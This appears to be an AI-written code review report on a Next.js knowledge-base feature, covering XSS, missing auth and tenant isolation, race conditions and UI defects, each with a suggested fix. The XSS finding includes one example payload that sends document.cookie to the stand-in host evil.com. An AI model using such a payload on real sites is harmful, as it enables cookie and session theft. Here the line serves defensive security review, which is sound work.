# Knowledge Base Feature - Code Review Report

**Reviewer:** Claude Opus 4 (AI Code Reviewer)
**Date:** 2026-02-09
**Feature:** Knowledge Base (KB) - Categories, Articles, Feedback, Search
**Severity Legend:** C = Critical, M = Major, m = Minor

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 7     |
| Major    | 9     |
| Minor    | 12    |
| **Total** | **28** |

---

## Critical Issues

### C-1: XSS via `dangerouslySetInnerHTML` on unsanitized `contentHtml`

**Files:**
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/[id]/page.tsx` (line 339)
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/[id]/preview/page.tsx` (line 217)

**Description:**
Both the article detail page and the preview page render `article.contentHtml` directly via `dangerouslySetInnerHTML` with zero sanitization. The `contentHtml` field is accepted as a raw string from the API (`createArticleSchema` at `kb.ts:48`) with no server-side sanitization either. Any user (or attacker via API) can inject arbitrary JavaScript:

```tsx
// [id]/page.tsx:337-339
{article.contentHtml ? (
  <div
    className="prose prose-sm max-w-none"
    dangerouslySetInnerHTML={{ __html: article.contentHtml }}
  />
```

An attacker could store `<script>document.location='https://evil.com?c='+document.cookie</script>` as `contentHtml`, and it would execute for any viewer.

**Suggested Fix:**
Install and use a sanitization library (e.g., `DOMPurify` or `isomorphic-dompurify`) before rendering:
```tsx
import DOMPurify from 'isomorphic-dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(article.contentHtml) }}
```
Additionally, sanitize on the server side in the POST/PATCH handlers before storing.

---

### C-2: XSS via search highlight injection in `/api/kb/search`

**File:** `/Users/chong/hubspot-demo/src/app/api/kb/search/route.ts` (lines 74-88)

**Description:**
The search endpoint wraps matches in `<mark>` tags using regex replacement on the excerpt. While `escapeRegExp` is used for the query, the *excerpt text itself* is not HTML-escaped before the `<mark>` tags are injected. If an article's excerpt already contains HTML entities or tags, those will pass through.

More importantly, the frontend that renders `highlightedExcerpt` could render it with `dangerouslySetInnerHTML` to display the `<mark>` tags, which would execute any stored XSS in the excerpt.

```typescript
// search/route.ts:78-83
const regex = new RegExp(`(${escapeRegExp(q)})`, "gi");
highlightedExcerpt = highlightedExcerpt.replace(
  regex,
  "<mark>$1</mark>"
);
```

**Suggested Fix:**
HTML-escape the excerpt content BEFORE wrapping matches in `<mark>` tags:
```typescript
function escapeHtml(text: string): string {
  return text.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}
highlightedExcerpt = escapeHtml(highlightedExcerpt);
// then apply <mark> wrapping
```

---

### C-3: Hardcoded `tenantId` - No real multi-tenancy enforcement

**Files:** All API route files (every handler)

**Description:**
Every API handler uses `const tenantId = "demo-tenant"` hardcoded. While acceptable for a demo/prototype, this means:
1. There is no actual tenant isolation. All data belongs to `"demo-tenant"`.
2. When auth is introduced, forgetting to replace all hardcoded values will be a critical security gap.
3. The `tenantId` is not derived from the authenticated user's session/JWT, so there is no access control whatsoever.

Per project rules (CLAUDE.md): "Every API/Query MUST have `WHERE tenant_id = ?`" - while the queries technically include `tenantId`, the value is not derived from authentication.

**Suggested Fix:**
Create a utility function `getTenantId(request: NextRequest): string` that extracts the tenant from the authenticated session. Use it in every route handler. For the demo phase, it can still return `"demo-tenant"` but centralizes the logic.

---

### C-4: Publish bypass via PATCH - incomplete guard

**File:** `/Users/chong/hubspot-demo/src/app/api/kb/articles/[id]/route.ts` (lines 122-128)

**Description:**
The PATCH endpoint attempts to prevent publishing via PATCH by checking `if (status === "published" && existing.status !== "published")`. However, this guard has a logic flaw: if an article is ALREADY published (`existing.status === "published"`), the PATCH allows setting `status: "published"` again (no-op but still bypasses the guard). More critically, there is no protection against setting status to `"archived"` and then back to `"published"` in two separate PATCH calls, completely bypassing the `/publish` endpoint's validation (which checks for required `title` and `contentHtml`).

Attack scenario:
1. Create article with no content
2. PATCH `{ status: "published" }` - blocked by guard
3. PATCH `{ status: "archived" }` - allowed
4. PATCH `{ status: "published" }` - blocked by guard (existing is "archived", not "published")

Wait - actually, step 4 would still be blocked. Let me re-analyze: The guard blocks transitioning TO "published" from any non-published state. This is correct.

However, a re-publish scenario is problematic: once an article is published and then unpublished via PATCH to "draft", publishing it again via PATCH is blocked but there's no way to re-publish without `contentHtml` check since `/publish` blocks "already published". The real issue is that an article that was previously published and is now draft can be re-published via PATCH if `existing.status === "published"` -- wait, no, it would be "draft" at that point.

**Revised Critical Issue:** The actual vulnerability is that the `createArticleSchema` allows `status: "published"` on the **POST** (create) endpoint at `articles/route.ts:187`:
```typescript
status: status || "draft",
```
If a client sends `{ title: "x", status: "published" }` in the POST body, the article is created as published immediately, bypassing the `/publish` endpoint's content validation entirely (no check for `contentHtml`).

**Suggested Fix:**
In the POST handler for article creation, force `status: "draft"` regardless of input:
```typescript
status: "draft", // Always create as draft, use /publish to publish
```
Or remove `status` from `createArticleSchema`.

---

### C-5: Feedback counter race condition

**File:** `/Users/chong/hubspot-demo/src/app/api/kb/articles/[id]/feedback/route.ts` (lines 120-174)

**Description:**
The feedback endpoint uses `$transaction` for atomicity, which is good. However, there is a race condition between the `findUnique` check (line 110) and the `update`/`create` operations (lines 124-174). Two concurrent requests with the same `visitorId` could both pass the `findUnique` check (both see no existing record), then both attempt to create, causing:
1. A unique constraint violation on `articleId_visitorId`
2. Double-counting of the feedback in `helpfulCount`/`notHelpfulCount`

Additionally, the counter update at line 170 has a subtle bug:
```typescript
helpfulCount: isHelpful ? { increment: 1 } : undefined,
notHelpfulCount: !isHelpful ? { increment: 1 } : undefined,
```
Using `undefined` means the field is not included in the update. This is correct behavior with Prisma, but it's fragile and non-obvious.

**Suggested Fix:**
Use Prisma's `upsert` with the unique constraint instead of a manual check-then-create pattern. Wrap the entire operation in an interactive transaction with appropriate isolation level:
```typescript
await prisma.$transaction(async (tx) => {
  const existing = await tx.kBArticleFeedback.findUnique({...});
  // ... create or update within tx
}, { isolationLevel: 'Serializable' });
```

---

### C-6: No tenant check on feedback query in GET `/api/kb/articles/[id]`

**File:** `/Users/chong/hubspot-demo/src/app/api/kb/articles/[id]/route.ts` (lines 49-56)

**Description:**
After fetching the article (which correctly filters by `tenantId`), the feedback summary queries do NOT filter by `tenantId`:

```typescript
const [helpfulCount, notHelpfulCount] = await Promise.all([
  prisma.kBArticleFeedback.count({
    where: { articleId: id, isHelpful: true },
  }),
  prisma.kBArticleFeedback.count({
    where: { articleId: id, isHelpful: false },
  }),
]);
```

While the article ID itself is already tenant-scoped (found via tenantId filter), the feedback count is technically correct since feedback references a specific article. However, in a multi-tenant system, feedback from other tenants (if they somehow reference the same article ID) would be included. This is more of an architectural concern than an active vulnerability given UUID IDs, but it violates the project rule of always filtering by `tenantId`.

**Suggested Fix:**
Add `tenantId` to the feedback count queries for defense-in-depth:
```typescript
where: { articleId: id, tenantId, isHelpful: true },
```

---

### C-7: No authentication or authorization on any endpoint

**Files:** All API route files

**Description:**
None of the API endpoints check for authentication. Any unauthenticated user can:
- Create, update, delete articles and categories
- Publish articles
- Submit unlimited feedback (potential spam/abuse)
- Access all knowledge base data

This is a critical security gap. Even in a demo, the feedback endpoint is publicly writable with no rate limiting, making it vulnerable to spam abuse.

**Suggested Fix:**
Add authentication middleware. At minimum, protect write operations (POST, PATCH, DELETE) behind auth. The feedback endpoint, if intended to be public, should have rate limiting by IP address.

---

## Major Issues

### M-1: API response shape inconsistency between endpoints

**Files:**
- `/Users/chong/hubspot-demo/src/app/api/kb/categories/route.ts` (line 56 vs 144)
- `/Users/chong/hubspot-demo/src/app/api/kb/articles/route.ts` (line 97 vs 207)

**Description:**
The GET list endpoints return `{ data: [...] }` wrapper format, but the POST create endpoints return the raw object without a wrapper. The individual GET endpoint at `categories/[id]/route.ts:72` returns raw object, while `articles/route.ts` GET returns `{ data: [...], pagination: {...} }`.

This inconsistency forces the frontend to do awkward handling like:
```tsx
// [id]/page.tsx:88
setArticle(data.data || data);
// new/page.tsx:73
router.push(`/knowledge-base/${article.id || article.data?.id}/edit`);
```

**Suggested Fix:**
Standardize all API responses to use a consistent envelope:
```json
{ "data": <resource>, "meta": { "pagination": {...} } }
```

---

### M-2: Editor sends `content` field but schema expects `contentHtml`

**File:** `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/[id]/edit/page.tsx` (lines 89, 133)

**Description:**
The editor page loads `art.content` into state (line 89) and sends it as `content` in the PATCH body (line 137):
```tsx
setContent(art.content || "");
// ...
body: JSON.stringify({
  content,  // <-- not a valid field!
  // ...
})
```

However, the `updateArticleSchema` in `kb.ts` does NOT have a `content` field. It has `contentHtml` and `contentJson`. The `content` field will be silently stripped by Zod's parsing (since the schema is partial, extra fields are stripped). This means **the editor's content area never actually saves**.

The textarea at line 329 is labeled "Content (HTML)" and the user types HTML, but it's being sent as `content` instead of `contentHtml`.

**Suggested Fix:**
Change the editor to use `contentHtml` instead of `content`:
```tsx
setContent(art.contentHtml || "");
// In save handler:
body: JSON.stringify({
  contentHtml: content,
  // ...
})
```

---

### M-3: Frontend `Article` type has `content` field but DB schema does not

**Files:**
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/[id]/page.tsx` (line 48)
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/[id]/edit/page.tsx` (line 33)
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/[id]/preview/page.tsx` (line 39)

**Description:**
The frontend `Article` interface includes `content: string | null` but the Prisma schema (`KBArticle`) has no `content` field -- only `contentJson` and `contentHtml`. The API never returns a `content` field, so `article.content` will always be `undefined`.

Multiple components check for `article.content` as a fallback:
```tsx
// [id]/page.tsx:341
) : article.content ? (
  <div className="text-gray-700 text-sm whitespace-pre-wrap">
    {article.content}
  </div>
```

This dead code path will never execute.

**Suggested Fix:**
Remove `content` from the `Article` interface and update all references to use `contentHtml` or `contentJson`.

---

### M-4: Category deletion does not cascade to children or reassign articles

**File:** `/Users/chong/hubspot-demo/src/app/api/kb/categories/[id]/route.ts` (lines 182-216)

**Description:**
When a category is soft-deleted, its children categories and associated articles are NOT updated. This creates orphaned references:
1. Child categories still reference a deleted parent (`parentId` points to a soft-deleted category)
2. Articles still reference a deleted category (`categoryId` points to a soft-deleted category)

The frontend delete modal says "Articles in this category will become uncategorized" but the backend does not implement this behavior.

**Suggested Fix:**
When soft-deleting a category:
1. Set `parentId = null` on all child categories
2. Set `categoryId = null` on all articles referencing this category
3. Or recursively soft-delete children as well

---

### M-5: Tab counts are calculated from filtered results, not totals

**File:** `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/page.tsx` (lines 160-165)

**Description:**
The tab counts are calculated from the currently loaded `articles` array, which is already filtered by the active tab:

```tsx
const tabCounts = {
  all: articles.length,
  draft: articles.filter((a) => a.status === "draft").length,
  published: articles.filter((a) => a.status === "published").length,
  archived: articles.filter((a) => a.status === "archived").length,
};
```

When "Draft" tab is active, the API returns only draft articles. So `tabCounts.all` shows the count of draft articles, `tabCounts.published` shows 0, etc. This is misleading to users.

**Suggested Fix:**
Fetch total counts separately via an API call that returns counts by status regardless of the current filter. Or always fetch all articles and filter client-side.

---

### M-6: Search input triggers API call on every keystroke

**File:** `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/page.tsx` (lines 65-83, 259-262)

**Description:**
`searchQuery` is in the dependency array of `fetchArticles` (via `useCallback`), and the search input calls `setSearchQuery` on every `onChange` event. This triggers a new API request on every single keystroke, creating excessive network traffic and potential performance issues.

**Suggested Fix:**
Implement debouncing on the search input. Use a debounced value:
```tsx
const [debouncedSearch] = useDebounce(searchQuery, 300);
// Use debouncedSearch in fetchArticles dependency
```

---

### M-7: No pagination controls on articles list page

**File:** `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/page.tsx`

**Description:**
The API returns pagination metadata (`pagination: { page, limit, total, totalPages }`) but the frontend doesn't use it. There are no pagination controls (prev/next buttons), no page state, and no way to navigate past the first 20 articles (the default limit). Users with more than 20 articles will not be able to see them all.

**Suggested Fix:**
Add pagination state and controls:
```tsx
const [page, setPage] = useState(1);
// Add page to URL params in fetchArticles
// Add pagination buttons after the table
```

---

### M-8: Circular parent reference not prevented for deeply nested categories

**File:** `/Users/chong/hubspot-demo/src/app/api/kb/categories/[id]/route.ts` (lines 120-125)

**Description:**
The PATCH handler checks if `parentId === id` (self-reference) but does NOT check for circular references in deeper nesting. For example:
- Category A has parent B
- Category B is updated to have parent A
- This creates a circular reference: A -> B -> A

**Suggested Fix:**
Walk the parent chain before updating to detect cycles:
```typescript
async function wouldCreateCycle(categoryId: string, newParentId: string): Promise<boolean> {
  let current = newParentId;
  while (current) {
    if (current === categoryId) return true;
    const parent = await prisma.kBCategory.findFirst({
      where: { id: current }, select: { parentId: true }
    });
    current = parent?.parentId || '';
  }
  return false;
}
```

---

### M-9: Feedback GET endpoint missing tenant filtering on feedback records

**File:** `/Users/chong/hubspot-demo/src/app/api/kb/articles/[id]/feedback/route.ts` (lines 35-48)

**Description:**
The GET handler fetches feedback comments without filtering by `tenantId`:
```typescript
const feedbackWithComments = await prisma.kBArticleFeedback.findMany({
  where: {
    articleId: id,
    comment: { not: null },
  },
  // No tenantId filter
});
```

While the article existence check above uses `tenantId`, the feedback query itself doesn't, violating the project's security rule.

**Suggested Fix:**
Add `tenantId` to the feedback query's where clause.

---

## Minor Issues

### m-1: Duplicate `Article` and `Category` type definitions across pages

**Files:**
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/page.tsx` (lines 26-44)
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/new/page.tsx` (lines 12-17)
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/[id]/page.tsx` (lines 29-62)
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/[id]/edit/page.tsx` (lines 21-45)
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/[id]/preview/page.tsx` (lines 22-47)
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/categories/page.tsx` (lines 20-30)

**Description:**
The `Article`, `Category`, and `Feedback` interfaces are duplicated across 6 files with inconsistent shapes (e.g., `Article` in `page.tsx` has no `content` but `[id]/page.tsx` has `content`; `Category` in some files has `parentId`, in others it doesn't).

**Suggested Fix:**
Create a shared types file:
```
src/types/kb.ts
```
Export all KB-related types from there and import in each page.

---

### m-2: Missing `aria-label` on icon-only buttons

**Files:**
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/page.tsx` (line 367-376) - MoreHorizontal button
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/[id]/page.tsx` (line 201) - X close button
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/page.tsx` (line 282) - X close error button

**Description:**
Multiple buttons contain only icons with no accessible label. Screen readers cannot determine the button's purpose.

**Suggested Fix:**
Add `aria-label` attributes:
```tsx
<button aria-label="More actions" ...>
<button aria-label="Dismiss error" ...>
```

---

### m-3: Missing keyboard trap handling in modals

**Files:**
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/page.tsx` (lines 469-502)
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/[id]/page.tsx` (lines 458-493)
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/categories/page.tsx` (lines 313-441, 444-479)

**Description:**
The modal dialogs lack:
1. Focus trapping (tab can escape the modal)
2. Escape key handling to close the modal
3. `role="dialog"` and `aria-modal="true"` attributes
4. `aria-labelledby` pointing to the modal title

**Suggested Fix:**
Use a proper modal component (e.g., Headless UI `Dialog`) or implement focus trapping and keyboard handling manually.

---

### m-4: `GlobeLock` import unused in some scenarios

**File:** `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/[id]/page.tsx` (line 11)

**Description:**
`GlobeLock` is imported but only conditionally used. This is fine for runtime but contributes to bundle size. Minor tree-shaking concern.

**Suggested Fix:**
No action required - bundlers with tree-shaking handle this. Leaving as informational.

---

### m-5: `formatDate` function duplicated across 4 files

**Files:**
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/page.tsx` (line 175)
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/[id]/page.tsx` (line 145)
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/[id]/edit/page.tsx` (line 191)
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/[id]/preview/page.tsx` (line 116)

**Description:**
Each file has its own `formatDate` implementation with slightly different format options (some include time, some don't).

**Suggested Fix:**
Create a shared utility:
```
src/lib/utils/date.ts
export function formatDate(dateStr: string, options?: Intl.DateTimeFormatOptions)
export function formatDateTime(dateStr: string)
```

---

### m-6: Inconsistent response shape for delete operations

**Files:**
- `/Users/chong/hubspot-demo/src/app/api/kb/categories/[id]/route.ts` (line 208)
- `/Users/chong/hubspot-demo/src/app/api/kb/articles/[id]/route.ts` (line 218)

**Description:**
Delete endpoints return `{ success: true }` which is fine, but other mutation endpoints return the full resource. No consistent convention for delete responses (some apps return 204 No Content).

**Suggested Fix:**
Either return 204 with no body, or keep `{ success: true }` but document the convention.

---

### m-7: `statusColor` function duplicated and not reusable

**Files:**
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/page.tsx` (lines 184-195)
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/[id]/page.tsx` (lines 179-184)
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/[id]/edit/page.tsx` (lines 227-232)

**Description:**
Status color mapping is duplicated. The page list uses a function, while detail and edit pages use inline ternaries. All produce the same output.

**Suggested Fix:**
Extract to a shared utility or constant map:
```typescript
export const KB_STATUS_COLORS: Record<string, string> = {
  published: "bg-green-50 text-green-700",
  draft: "bg-yellow-50 text-yellow-700",
  archived: "bg-gray-100 text-gray-600",
};
```

---

### m-8: Slug uniqueness check has a TOCTOU race condition

**Files:**
- `/Users/chong/hubspot-demo/src/app/api/kb/categories/route.ts` (lines 90-102)
- `/Users/chong/hubspot-demo/src/app/api/kb/articles/route.ts` (lines 150-157)

**Description:**
The slug uniqueness check (find existing, then create) is not atomic. Two concurrent requests with the same title could both pass the uniqueness check and then one would fail with a database unique constraint violation (unhandled).

**Suggested Fix:**
Catch the unique constraint violation from Prisma and retry with a different slug, or use a database-level upsert pattern. The `Date.now()` suffix approach is reasonable but should be wrapped in a try/catch for the constraint error.

---

### m-9: `contentJson` validation is `z.unknown()` - too permissive

**File:** `/Users/chong/hubspot-demo/src/lib/validations/kb.ts` (line 47)

**Description:**
```typescript
contentJson: z.unknown().optional(),
```
This accepts absolutely any value including deeply nested objects, arrays with millions of elements, etc. No size limit, no structure validation. A malicious client could send a massive JSON payload to cause storage and parsing issues.

**Suggested Fix:**
Add at minimum a size check via `z.any().refine()` or define a basic structure. At minimum, restrict to objects:
```typescript
contentJson: z.record(z.unknown()).optional(),
```

---

### m-10: `parseInt` on query params without NaN handling

**Files:**
- `/Users/chong/hubspot-demo/src/app/api/kb/articles/route.ts` (lines 33-37)
- `/Users/chong/hubspot-demo/src/app/api/kb/search/route.ts` (lines 15-19)

**Description:**
```typescript
const page = Math.max(1, parseInt(searchParams.get("page") || "1"));
```
If `page=abc` is passed, `parseInt("abc")` returns `NaN`. `Math.max(1, NaN)` returns `NaN`. This would cause Prisma to fail with an unclear error when `skip: NaN` is passed.

**Suggested Fix:**
```typescript
const page = Math.max(1, parseInt(searchParams.get("page") || "1") || 1);
```
The trailing `|| 1` catches `NaN`.

---

### m-11: Missing loading state for publish action on list page

**File:** `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/page.tsx` (lines 121-136)

**Description:**
The `handlePublish` function has no loading state indicator. When a user clicks "Publish" from the dropdown menu, there's no visual feedback that the action is in progress. The duplicate action has the same issue.

**Suggested Fix:**
Add a `publishing` state variable and show a spinner on the publish button while the request is in flight.

---

### m-12: Delete modal says "cannot be undone" but uses soft delete

**Files:**
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/page.tsx` (lines 480-481)
- `/Users/chong/hubspot-demo/src/app/(dashboard)/knowledge-base/[id]/page.tsx` (lines 468-470)

**Description:**
The delete confirmation modals state "This action cannot be undone" but the backend performs a soft delete (sets `deletedAt`). This is misleading to users -- the data is actually recoverable. On the positive side, soft delete is correct per project rules.

**Suggested Fix:**
Change the message to something more accurate: "This article will be moved to trash." or "This article will be hidden from the knowledge base."

---

## Positive Observations

1. **Soft delete is used correctly** for both articles and categories, complying with project rules.
2. **Zod validation** is consistently applied on all write endpoints.
3. **Sort field whitelisting** in articles list prevents order-by injection.
4. **`escapeRegExp`** is correctly used in the search endpoint to prevent ReDoS.
5. **Foreign key validation** is performed before creating/updating articles with a `categoryId`.
6. **Self-reference prevention** exists for category parent assignment.
7. **Transaction usage** for feedback counter updates ensures atomicity.
8. **Pagination** is implemented on the API side with proper bounds checking.
9. **Empty states** are well-designed with clear CTAs.
10. **Loading states** exist on most pages with consistent spinner usage.

---

## Recommended Priority Order for Fixes

1. **C-1 + C-2**: XSS vulnerabilities (immediate risk)
2. **C-4**: Publish bypass via POST create
3. **M-2 + M-3**: Editor content field mismatch (feature is broken)
4. **C-5**: Feedback race condition
5. **M-1**: Response shape standardization
6. **M-4**: Category deletion cascading
7. **M-6**: Search debouncing
8. **M-5**: Tab count accuracy
9. **C-3 + C-7**: Auth/tenant (pre-production requirement)
10. All minor items

---

*Report generated on 2026-02-09 by Claude Opus 4 AI Code Reviewer*
